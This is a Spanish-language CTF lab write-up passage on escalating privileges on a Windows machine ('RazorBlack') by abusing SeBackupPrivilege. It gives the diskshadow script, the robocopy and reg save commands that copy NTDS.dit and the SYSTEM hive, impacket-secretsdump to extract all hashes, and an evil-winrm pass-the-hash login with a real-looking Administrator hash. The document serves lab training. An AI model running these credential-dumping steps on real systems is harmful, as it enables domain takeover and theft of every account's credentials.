Ahora nos encontramos que tenemos los permisos de `SeBackupPrivilage` en la cual tenemos el siguiente articulo que explica bien como explotarla
```
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
```
![[Pasted image 20240731121802.png]]
- `SeBackupPrivilege`:  Proporciona a los usuarios permisos de lectura completos y la capacidad de crear copias de seguridad del sistema. El acceso de lectura completo permite leer cualquier archivo del objetivo, incluidos los archivos sensibles del sistema como _SAM_, _SYSTEM_ o _NTDS.dit_. Un potencial atacante puede aprovechar este privilegio para extraer los _hashes_ de estos archivos sensibles, descifrarlos o pasarlos (PTH) para elevar su shell.

Para empezar la escalada de privilegios comenzaremos creando el siguiente script
```Powershell
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
![[Pasted image 20240731125129.png]]

Ahora enviamos el script a la maquina victima
![[Pasted image 20240731125356.png]]

Ahora lo ejecutamos con la utilidad `diskshadows`
```
diskshadow /s script.txt
```
![[Pasted image 20240731125643.png]]
![[Pasted image 20240731125659.png]]

Al finalizar se nos creara una unidad adicional
![[Pasted image 20240731125738.png]]

Ahora con la utilidad `robocopy` realizaremos una copia del fichero `NTDS.dit`
```
robocopy /b E:\Windows\ntds . ntds.dit
```
![[Pasted image 20240731130026.png]]
![[Pasted image 20240731130039.png]]

Una vez finalice seguiremos generando un respaldo del registro `SYSTEM`, nos valdra para conseguir descifrar el fichero `NTDS.dit`
```
reg save hklm\system .\system.copy
```
![[Pasted image 20240731130227.png]]

Ahora traemos estos dos ficheros a nuestro equipo para extraer los hashes de todos los usuarios
![[Pasted image 20240731130340.png]]
![[Pasted image 20240731131837.png]]

Ejecutamos `secretsdump` y obtendremos todos los hashes del sistema
```
impacket-secretsdump -system system.copy -ntds ntds.dit local
```
![[Pasted image 20240731133716.png]]

Ahora si probamos ha acceder con el usuario Administrator ya habremos escalado los privilegios
```
evil-winrm -i 10.10.56.42 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
```
![[Pasted image 20240731133846.png]]

[[MAQUINA RAZORBLACK (Explotación servicio kerberos, montura de sistema de archivos,  acceso por pass-the-hash y escalada de privilegios explotando permiso SeBackupPrivilage)]]

